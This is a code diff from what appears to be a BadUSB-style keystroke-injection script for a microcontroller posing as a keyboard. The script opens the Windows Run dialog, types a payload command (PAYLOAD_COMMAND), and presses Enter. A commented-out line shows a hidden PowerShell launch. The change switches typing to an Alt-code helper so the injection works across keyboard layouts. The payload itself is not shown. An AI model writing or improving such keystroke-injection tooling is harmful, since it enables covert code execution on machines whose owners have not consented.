@@ -63,10 +63,11 @@ def write_with_alt(text):
             
         kbd.release(Keycode.LEFT_ALT)
         time.sleep(0.01) # Pausa tra un carattere e l'altro
+
 def win_exec(text):
     kbd.send(Keycode.GUI, Keycode.R)
     time.sleep(SLEEP_TIME)
-    layout.write(text)
+    write_with_alt(text)
     
 def exec_payload():
     #win_exec("powershell -w hidden")
@@ -77,7 +78,7 @@ def exec_payload():
     time.sleep(1.0)
     
     payload_url = PAYLOAD_COMMAND
-    layout.write(payload_url)
+    write_with_alt(payload_url)
     
     time.sleep(SLEEP_TIME)
     kbd.send(Keycode.ENTER)
